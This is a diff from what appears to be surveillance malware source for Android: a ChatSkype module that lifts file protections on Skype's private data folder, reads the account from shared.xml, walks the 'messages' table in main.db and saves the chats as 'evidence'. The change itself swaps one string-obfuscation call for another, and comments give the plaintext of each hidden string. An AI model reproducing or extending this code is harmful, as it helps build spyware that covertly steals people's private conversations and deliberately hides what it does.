@@ -99,7 +99,7 @@ public class ChatSkype extends SubModuleChat {
 			boolean updateMarkup = false;
 
 			// k_0=/data/data/com.skype.raider/files
-			String dbDir = M.d("/data/data/com.skype.raider/files");
+			String dbDir = M.e("/data/data/com.skype.raider/files");
 			Path.unprotect(dbDir, true);
 
 			String account = readAccount();
@@ -110,7 +110,7 @@ public class ChatSkype extends SubModuleChat {
 				Check.log(TAG + " (readSkypeMessageHistory) account: " + account);
 			}
 			// k_1=/main.db
-			String dbFile = dbDir + "/" + account + M.d("/main.db");
+			String dbFile = dbDir + "/" + account + M.e("/main.db");
 
 			Path.unprotect(dbDir + "/" + account, true);
 			Path.unprotect(dbFile, true);
@@ -292,7 +292,7 @@ public class ChatSkype extends SubModuleChat {
 
 			// f_a=messages
 			// M.d("messages")
-			long newLastId = helper.traverseRecords(M.d("messages"), visitor);
+			long newLastId = helper.traverseRecords(M.e("messages"), visitor);
 
 			if (messages != null && messages.size() > 0) {
 				saveEvidence(messages);
@@ -329,10 +329,10 @@ public class ChatSkype extends SubModuleChat {
 	private String readAccount() throws IOException {
 
 		// k_0=/data/data/com.skype.raider/files
-		String dbDir = M.d("/data/data/com.skype.raider/files");
+		String dbDir = M.e("/data/data/com.skype.raider/files");
 
 		// k_2=/shared.xml
-		String confFile = dbDir + M.d("/shared.xml");
+		String confFile = dbDir + M.e("/shared.xml");
 
 		Path.unprotect(confFile, true);
 
